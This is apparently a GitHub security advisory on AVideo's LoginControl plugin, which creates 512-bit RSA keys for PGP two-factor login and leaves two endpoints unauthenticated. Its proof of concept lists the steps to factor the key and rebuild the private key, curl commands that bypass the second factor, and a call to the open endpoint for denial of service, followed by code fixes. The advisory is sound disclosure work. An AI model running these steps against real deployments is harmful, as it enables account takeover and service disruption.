# [H] AVideo has a PGP 2FA Bypass via Cryptographically Broken 512-bit RSA Key Generation in LoginControl Plugin

## Summary
Severity: High
Advisory: GHSA-6m5f-j7w2-w953
CVE: CVE-2026-33488
CWE: CWE-326
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-6m5f-j7w2-w953
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The `createKeys()` function in the LoginControl plugin's PGP 2FA system generates 512-bit RSA keys, which have been publicly factorable since 1999. An attacker who obtains a target user's public key can factor the 512-bit RSA modulus on commodity hardware in hours, derive the complete private key, and decrypt any PGP 2FA challenge issued by the system — completely bypassing the second authentication factor. Additionally, the `generateKeys.json.php` and `encryptMessage.json.php` endpoints lack any authentication checks, exposing CPU-intensive key generation to anonymous users.

## Details

The vulnerability originates in `plugin/LoginControl/pgp/functions.php` at line 26:

```php
// plugin/LoginControl/pgp/functions.php:26
$privateKey = RSA::createKey(512);
```

This code was copied from the `singpolyma/openpgp-php` library's example/demo code, which was never intended for production use. The entire PGP 2FA flow relies on these weak keys:

1. **Key generation**: When a user enables PGP 2FA, the UI calls `createKeys()` which generates a 512-bit RSA keypair. The public key is saved to the database via `savePublicKey.json.php`.

2. **Challenge creation** (`LoginControl.php:520-531`): During login, a `uniqid()` token is generated, stored in the session, and encrypted with the user's stored public key:
```php
// LoginControl.php:525-530
$_SESSION['user']['challenge']['text'] = uniqid();
$encMessage = self::encryptPGPMessage(User::getId(), $_SESSION['user']['challenge']['text']);
```

3. **Challenge verification** (`LoginControl.php:533-539`): The user must decrypt the challenge and submit the plaintext. Verification is a simple equality check:
```php
// LoginControl.php:534
if ($response == $_SESSION['user']['challenge']['text']) {
```

Since 512-bit RSA was publicly factored in 1999 (RSA-155 challenge), an attacker who obtains the public key can factor the modulus using freely available tools (CADO-NFS, msieve, yafu) in a matter of hours on modern hardware, reconstruct the complete private key from the prime factors, and decrypt any challenge encrypted with that key.

**Unauthenticated endpoints** (compounding issue):

`generateKeys.json.php` does not include `configuration.php` and has no authentication check:
```php
// plugin/LoginControl/pgp/generateKeys.json.php:1-2
<?php
require_once  '../../../plugin/LoginControl/pgp/functions.php';
```

Similarly, `encryptMessage.json.php` has no authentication. Both are accessible to anonymous users, enabling abuse of CPU-intensive RSA key generation for denial-of-service.

## PoC

**Step 1: Obtain the target user's 512-bit public key**

The public key must be obtained through a side channel (e.g., the user sharing it per PGP conventions, another vulnerability leaking database contents, or admin access). The key is stored in the `users_externalOptions` table under the key `PGPKey`.

**Step 2: Extract the RSA modulus from the public key**

```bash
# Extract the modulus from the PGP public key
echo "$PUBLIC_KEY_ARMOR" | gpg --import 2>/dev/null
gpg --list-keys --with-key-data | grep '^pub'
# Or use Python:
python3 -c "
from Crypto.PublicKey import RSA
# Parse the PGP key and extract RSA modulus N
# N will be a ~155-digit number (512 bits)
print(f'N = {key.n}')
"
```

**Step 3: Factor the 512-bit modulus**

```bash
# Using CADO-NFS (typically completes in 2-8 hours on a modern desktop)
cado-nfs.py <modulus_decimal>
# Or using msieve:
msieve -v <modulus_decimal>
# Output: p = <factor1>, q = <factor2>
```

**Step 4: Reconstruct the private key and decrypt the 2FA challenge**

```python
from Crypto.PublicKey import RSA
from Crypto.Util.number import inverse

# From factoring step
p = <factor1>
q = <factor2>
n = p * q
e = 65537
d = inverse(e, (p-1)*(q-1))

# Reconstruct private key
privkey = RSA.construct((n, e, d, p, q))

# Decrypt the PGP-encrypted challenge from the login page
# and submit the plaintext to verifyChallenge.json.php
```

**Step 5: Submit decrypted challenge to bypass 2FA**

```bash
curl -b "session_cookie" \
  "https://target/plugin/LoginControl/pgp/verifyChallenge.json.php" \
  -d "response=<decrypted_uniqid_value>"
# Expected: {"error":false,"msg":"","response":"<value>"}
```

**Unauthenticated endpoint abuse:**

```bash
# No authentication required — CPU-intensive 512-bit RSA keygen
curl "https://target/plugin/LoginControl/pgp/generateKeys.json.php?keyPassword=test&keyName=test&keyEmail=test@test.com"
# Returns: {"error":false,"public":"-----BEGIN PGP PUBLIC KEY BLOCK-----...","private":"-----BEGIN PGP PRIVATE KEY BLOCK-----..."}
```

## Impact

- **2FA Bypass**: Any user who enabled PGP 2FA using the built-in key generator has their second factor effectively nullified. An attacker with knowledge of the password (phishing, credential stuffing, breach reuse) can bypass the 2FA protection entirely.
- **Account Takeover**: Combined with any credential compromise, this enables full account takeover of 2FA-protected accounts.
- **Denial of Service**: The unauthenticated `generateKeys.json.php` endpoint allows anonymous users to trigger CPU-intensive RSA key generation operations with no rate limiting.
- **Scope**: All users who enabled PGP 2FA using the application's built-in key generator are affected. Users who imported their own externally-generated keys with adequate key sizes (2048+ bits) are not affected by the key weakness, but the unauthenticated endpoints affect all deployments with the LoginControl plugin.

## Recommended Fix

**1. Increase RSA key size to 2048 bits minimum** (`plugin/LoginControl/pgp/functions.php:26`):

```php
// Before:
$privateKey = RSA::createKey(512);

// After:
$privateKey = RSA::createKey(2048);
```

**2. Add authentication to `generateKeys.json.php`** (match the pattern used in `decryptMessage.json.php`):

```php
<?php
require_once '../../../videos/configuration.php';
require_once '../../../plugin/LoginControl/pgp/functions.php';
header('Content-Type: application/json');

$obj = new stdClass();
$obj->error = true;

$plugin = AVideoPlugin::loadPluginIfEnabled('LoginControl');

if (!User::isLogged()) {
    $obj->msg = "Authentication required";
    die(json_encode($obj));
}
// ... rest of existing code
```

**3. Add authentication to `encryptMessage.json.php`** (same pattern):

```php
<?php
require_once '../../../videos/configuration.php';
require_once '../../../plugin/LoginControl/pgp/functions.php';
// Add auth check before processing
if (!User::isLogged()) {
    $obj->msg = 'Authentication required';
    die(json_encode($obj));
}
```

**4. Add minimum key size validation in `savePublicKey.json.php`** to reject weak keys regardless of how they were generated:

```php
// After line 26, before saving:
$keyData = OpenPGP_Message::parse(OpenPGP::unarmor($_REQUEST['publicKey'], 'PGP PUBLIC KEY BLOCK'));
if ($keyData && $keyData[0] instanceof OpenPGP_PublicKeyPacket) {
    $bitLength = strlen($keyData[0]->key['n']) * 8;
    if ($bitLength < 2048) {
        $obj->msg = "Key size too small. Minimum 2048 bits required.";
        die(json_encode($obj));
    }
}
```

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-6m5f-j7w2-w953
- https://nvd.nist.gov/vuln/detail/CVE-2026-33488
- https://github.com/WWBN/AVideo/commit/00d979d87f8182095c8150609153a43f834e351e
- https://github.com/WWBN/AVideo
